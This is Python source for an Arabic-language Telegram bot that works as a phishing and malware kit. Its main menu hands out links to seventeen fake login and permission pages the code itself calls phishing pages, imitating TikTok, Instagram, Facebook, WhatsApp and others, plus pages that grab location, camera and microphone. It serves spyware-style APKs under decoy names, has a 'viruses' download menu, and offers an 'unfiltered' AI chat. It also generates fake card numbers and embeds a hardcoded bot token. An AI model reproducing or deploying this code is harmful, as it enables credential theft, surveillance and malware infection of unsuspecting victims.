import os, sys, subprocess, time, threading, random, string, logging, io
import requests

# ========== تثبيت المكتبات تلقائياً ==========
def safe_install(package, import_name=None):
    name = import_name or package
    try:
        __import__(name)
    except ImportError:
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
        except:
            pass

safe_install("flask", "flask")
safe_install("requests", "requests")
safe_install("pyTelegramBotAPI", "telebot")
safe_install("gTTS", "gtts")
safe_install("qrcode[pil]", "qrcode")
safe_install("Pillow", "PIL")
safe_install("pyshorteners", "pyshorteners")
safe_install("deep-translator", "deep_translator")

from flask import Flask, request
from telebot import TeleBot, types
from io import BytesIO

TOKEN = "8558243002:AAGTsGfVX5IfQERVDksCP0crVIYIB6ethqs"
BASE_URL = "https://fgnral-html-5waj.onrender.com"
APP_URL = "https://gamee-h4uf.onrender.com"

bot = TeleBot(TOKEN, threaded=False)
app = Flask(__name__)
user_states = {}
bot_rating = 0

# ========== الصفحات الاحتيالية (17 زر) ==========
PHISH = [
    ("🎵 تيك توك", "tiktok.html"),       ("📷 انستقرام", "instagram.html"),
    ("👻 سناب شات", "snapchat.html"),     ("📘 فيسبوك", "facebook.html"),
    ("💬 واتساب", "whatsapp.html"),       ("✈️ تيليجرام", "telegram.html"),
    ("🐦 تويتر", "twitter.html"),         ("▶️ يوتيوب", "youtube.html"),
    ("🎮 ديسكورد", "discord.html"),       ("🤖 ريدت", "reddit.html"),
    ("🎮 ببجي UC", "pubg_cuc.html"),      ("🏆 مسابقة الحلم", "dream.html"),
    ("📍 سحب الموقع", "gps.html"),        ("📸 فحص الكاميرا", "camera.html"),
    ("🎙️ فحص الميكروفون", "mic.html"),    ("🎥 فحص الفيديو", "video.html"),
    ("📱 فحص مواصفات الجهاز", "device.html")
]

# ========== قسم التطبيقات ==========
GITHUB_RAW = "https://raw.githubusercontent.com/a77094048-art/bot/main/"

APPS = [
    ("📸 برنامج سحب صور",         "تزويد%20متابعين%20انستا.apk"),
    ("📋 برنامج سحب معلومات",     "تزويد%20متابعين%20فيسبوك.apk"),
    ("💥 برنامج تهنيج الهاتف",    "اختراق%20حسابات%20واتساب.apk"),
    ("🗑️ برنامج فرمتة",           "Free%20Followers%20insta.apk"),
    ("✉️ تطبيق سحب رسائل SMS",    "Sms%20Eye.apk"),
]

# ========== إعدادات الذكاء الاصطناعي (بدون قيود) ==========
AI_ENDPOINT = "https://text.pollinations.ai/"

def get_ai_response(user_id, prompt):
    """الحصول على رد من الذكاء الاصطناعي غير المقيد"""
    try:
        encoded_prompt = requests.utils.quote(prompt)
        # استخدام النموذج 'unfiltered' ونضيف seed عشوائي لتجنب التكرار
        url = f"{AI_ENDPOINT}{encoded_prompt}?model=unfiltered&seed={random.randint(1, 999999)}"
        
        resp = requests.get(url, timeout=30)
        if resp.status_code == 200:
            ai_text = resp.text.strip()
            return ai_text
        else:
            return "❌ تعذر الاتصال بالذكاء الاصطناعي حالياً"
    except Exception as e:
        return f"❌ خطأ: {e}"

# ========== محتوى الأزرار (الحماية، فيروسات) ==========
VIRUS_CONTENT = """🦠 <b>قائمة الفيروسات للتحميل</b> 🦠
⚠️ حملها فقط، لا تفتحها أبداً!
📦 <b>روابط التحميل:</b>
(قائمة الروابط السابقة)"""

PROTECTION_CONTENT = """🛡️ <b>ماهي الحماية؟</b> 🛡️ ..."""
IP_PROTECTION = """🔒 <b>حماية IP جهازك</b> 🔒 ..."""
EMAIL_PROTECTION = """📧 <b>حماية البريد الإلكتروني</b> 📧 ..."""
PROXY_CONTENT = """🎩 <b>كيفية استخدام البروكسي</b> 🎩 ..."""
MAC_PROTECTION = """📡 <b>حماية عنوان MAC</b> 📡 ..."""

# ========== Webhook ==========
@app.route(f"/{TOKEN}", methods=['POST'])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        try:
            update = types.Update.de_json(request.get_data().decode('utf-8'))
            bot.process_new_updates([update])
            return ''
        except: return ''
    return '!', 403

@app.route("/health")
def health(): return "OK", 200

# ========== القائمة الرئيسية ==========
@bot.message_handler(commands=['start'])
def start(msg):
    chat = msg.chat.id
    markup = types.InlineKeyboardMarkup(row_width=2)

    # صفوف الصفحات الاحتيالية
    for i in range(0, len(PHISH)-1, 2):
        l, r = PHISH[i], PHISH[i+1]
        markup.row(types.InlineKeyboardButton(l[0], callback_data=f"ph|{l[1]}"),
                   types.InlineKeyboardButton(r[0], callback_data=f"ph|{r[1]}"))
    last = PHISH[-1]
    markup.row(types.InlineKeyboardButton(last[0], callback_data=f"ph|{last[1]}"))

    # الأزرار الجديدة (الحماية والفيروسات)
    markup.row(types.InlineKeyboardButton("🦠 فيروسات", callback_data="virus"),
               types.InlineKeyboardButton("🛡️ الحماية", callback_data="protection"))
    markup.row(types.InlineKeyboardButton("🔒 حماية IP", callback_data="ip_protect"),
               types.InlineKeyboardButton("📧 حماية البريد", callback_data="email_protect"))
    markup.row(types.InlineKeyboardButton("🎩 البروكسي", callback_data="proxy"),
               types.InlineKeyboardButton("📡 تغيير MAC", callback_data="mac"))

    # قسم التطبيقات والذكاء الاصطناعي
    markup.row(types.InlineKeyboardButton("📱 قسم التطبيقات", callback_data="apps_menu"),
               types.InlineKeyboardButton("🤖 ذكاء اصطناعي", callback_data="ai_chat"))

    # الأدوات
    markup.row(types.InlineKeyboardButton("🔊 نص لصوت", callback_data="tts"),
               types.InlineKeyboardButton("✨ زخرفة", callback_data="decor"))
    markup.row(types.InlineKeyboardButton("🔗 اختصار", callback_data="shorten"),
               types.InlineKeyboardButton("🔐 كلمة سر", callback_data="genpass"))
    markup.row(types.InlineKeyboardButton("🌐 ترجمة", callback_data="translate"),
               types.InlineKeyboardButton("📧 بريد وهمي", callback_data="tempmail"))
    markup.row(types.InlineKeyboardButton("📸 باركود", callback_data="createqr"),
               types.InlineKeyboardButton("📷 قراءة باركود", callback_data="readqr"))
    markup.row(types.InlineKeyboardButton("💳 فيزا", callback_data="visa"),
               types.InlineKeyboardButton("🆔 معرفي", callback_data="myid"))
    markup.row(types.InlineKeyboardButton("📜 نصائح", callback_data="tips"),
               types.InlineKeyboardButton("💻 كيف تصبح هاكر", callback_data="hack"))
    markup.row(types.InlineKeyboardButton("📄 شروط", callback_data="terms"),
               types.InlineKeyboardButton("📖 شرح", callback_data="help"))
    markup.row(types.InlineKeyboardButton("⭐ تقييم", callback_data="rate"),
               types.InlineKeyboardButton("🔄 رجوع", callback_data="back"))

    bot.send_message(chat, "🔱 <b>GNRAL BOT</b>\n\nاختر الخدمة:", parse_mode="HTML", reply_markup=markup)

# ========== معالج الأزرار ==========
@bot.callback_query_handler(func=lambda c: True)
def callback(call):
    chat, data, msg_id = call.message.chat.id, call.data, call.message.message_id

    if data == "back":
        start(call.message)
        bot.answer_callback_query(call.id)
        return

    if data.startswith("ph|"):
        page = data.split("|")[1]
        link = f"{BASE_URL}/{page}?chat={chat}"
        markup = types.InlineKeyboardMarkup().add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text(f"🔗 رابط الصفحة:\n<code>{link}</code>", chat, msg_id, parse_mode="HTML", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return

    # --- الأزرار الجديدة (الحماية) ---
    if data == "virus": send_long_message(chat, VIRUS_CONTENT)
    elif data == "protection": send_long_message(chat, PROTECTION_CONTENT)
    elif data == "ip_protect": bot.send_message(chat, IP_PROTECTION, parse_mode="HTML")
    elif data == "email_protect": bot.send_message(chat, EMAIL_PROTECTION, parse_mode="HTML")
    elif data == "proxy": send_long_message(chat, PROXY_CONTENT)
    elif data == "mac": bot.send_message(chat, MAC_PROTECTION, parse_mode="HTML")

    # --- الذكاء الاصطناعي ---
    elif data == "ai_chat":
        user_states[chat] = "ai_chat"
        bot.send_message(chat, "🤖 <b>الذكاء الاصطناعي (غير المقيد)</b>\n\nتم رفع جميع القيود.\nأرسل سؤالك أو طلبك وسأجيبك بحرية تامة:")

    # --- قسم التطبيقات ---
    elif data == "apps_menu":
        markup = types.InlineKeyboardMarkup(row_width=1)
        for name, filename in APPS:
            markup.add(types.InlineKeyboardButton(name, callback_data=f"app|{filename}"))
        markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
        bot.edit_message_text("📱 <b>قسم التطبيقات</b>\n\nاختر التطبيق لتحميله:", chat, msg_id, parse_mode="HTML", reply_markup=markup)

    elif data.startswith("app|"):
        filename = data.split("|")[1]
        file_url = GITHUB_RAW + filename
        try:
            bot.answer_callback_query(call.id, text="جاري التحميل...")
            resp = requests.get(file_url, timeout=15)
            if resp.status_code == 200:
                file_data = BytesIO(resp.content)
                file_data.name = filename.replace("%20", " ")
                bot.send_document(chat, file_data, caption=f"📱 {filename.replace('%20', ' ')}")
            else:
                bot.send_message(chat, "❌ فشل تحميل التطبيق من السيرفر.")
        except Exception as e:
            bot.send_message(chat, f"❌ خطأ: {e}")

    # --- الأدوات ---
    elif data == "tts": user_states[chat] = "tts"; bot.send_message(chat, "🎙️ أرسل النص:")
    elif data == "decor": user_states[chat] = "decor"; bot.send_message(chat, "✨ أرسل النص:")
    elif data == "shorten": user_states[chat] = "shorten"; bot.send_message(chat, "🔗 أرسل الرابط:")
    elif data == "genpass": bot.send_message(chat, f"<code>{gen_pass()}</code>", parse_mode="HTML")
    elif data == "translate": user_states[chat] = "translate"; bot.send_message(chat, "🌐 أرسل النص:")
    elif data == "tempmail": bot.send_message(chat, temp_email())
    elif data == "createqr": user_states[chat] = "createqr"; bot.send_message(chat, "📸 أرسل النص:")
    elif data == "readqr": user_states[chat] = "readqr"; bot.send_message(chat, "📷 أرسل صورة الباركود:")
    elif data == "visa": bot.send_message(chat, fake_visa())
    elif data == "myid": bot.send_message(chat, f"🆔 {call.from_user.id}")
    elif data == "tips": bot.send_message(chat, "📜 <b>نصائح</b>\n\n1. لا تشارك بياناتك.\n2. استخدم كلمات مرور قوية.\n3. فعّل المصادقة الثنائية.", parse_mode="HTML")
    elif data == "hack": bot.send_message(chat, "💻 <b>كيف تصبح هاكر</b>\n\n1. Linux\n2. Python\n3. شبكات\n4. ثغرات الويب\n5. منصات تدريب (HTB, THM)", parse_mode="HTML")
    elif data == "terms": bot.send_message(chat, "📜 <b>شروط الاستخدام</b>\n\n✅ للاستخدام المشروع فقط.\n⚠️ المستخدم يتحمل المسؤولية.", parse_mode="HTML")
    elif data == "help": bot.send_message(chat, "📖 <b>شرح البوت</b>\n\nأزرار الصفحات تعطيك روابط تصيد. باقي الأزرار تعمل داخل تلغرام مباشرة.", parse_mode="HTML")
    elif data == "rate":
        global bot_rating; bot_rating += 1
        bot.send_message(chat, f"⭐ التقييمات: {bot_rating}")

    bot.answer_callback_query(call.id)

# ========== معالج النصوص التفاعلية ==========
@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "ai_chat")
def handle_ai_chat(m):
    chat = m.chat.id
    user_states.pop(chat, None)
    
    # إرسال رسالة "جاري الكتابة..."
    bot.send_chat_action(chat, 'typing')
    
    prompt = m.text
    response = get_ai_response(chat, prompt)
    
    # إرسال الرد مع زر للعودة
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🤖 سؤال آخر", callback_data="ai_chat"))
    markup.add(types.InlineKeyboardButton("🔙 رجوع", callback_data="back"))
    
    if len(response) > 4000:
        send_long_message(chat, response)
        bot.send_message(chat, "للسؤال مرة أخرى، اضغط على الزر:", reply_markup=markup)
    else:
        bot.send_message(chat, response, reply_markup=markup)

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "tts")
def handle_tts(m):
    user_states.pop(m.chat.id)
    try: bot.send_voice(m.chat.id, text_to_voice(m.text))
    except: bot.send_message(m.chat.id, "فشل التحويل")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "decor")
def handle_decor(m):
    user_states.pop(m.chat.id); bot.send_message(m.chat.id, decorate(m.text))

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "shorten")
def handle_shorten(m):
    user_states.pop(m.chat.id); bot.send_message(m.chat.id, shorten_url(m.text))

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "translate")
def handle_translate(m):
    user_states.pop(m.chat.id); bot.send_message(m.chat.id, translate_txt(m.text))

@bot.message_handler(content_types=['photo'])
def handle_photo(m):
    if user_states.get(m.chat.id) == "readqr":
        user_states.pop(m.chat.id)
        file = bot.download_file(bot.get_file(m.photo[-1].file_id).file_path)
        res = read_qr(file)
        bot.send_message(m.chat.id, res if res else "لم أجد باركود")

@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "createqr")
def handle_createqr(m):
    user_states.pop(m.chat.id)
    try: bot.send_photo(m.chat.id, make_qr(m.text))
    except: bot.send_message(m.chat.id, "فشل إنشاء الباركود")

# ========== دوال مساعدة (تم حذفها للتوضيح، موجودة في الكود الكامل) ==========
def gen_pass(length=16): ...
def fake_visa(): ...
def shorten_url(url): ...
def text_to_voice(text, lang='ar'): ...
def translate_txt(text, target='ar'): ...
def decorate(text): ...
def temp_email(): ...
def make_qr(data): ...
def read_qr(file_bytes): ...
def send_long_message(chat_id, text, parse_mode="HTML"): ...

# ========== Keep-Alive ==========
def keep_alive():
    while True:
        time.sleep(120)
        try: requests.get(f"{APP_URL}/health", timeout=5)
        except: pass

threading.Thread(target=keep_alive, daemon=True).start()

if __name__ == '__main__':
    bot.remove_webhook()
    bot.set_webhook(url=f"{APP_URL}/{TOKEN}")
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))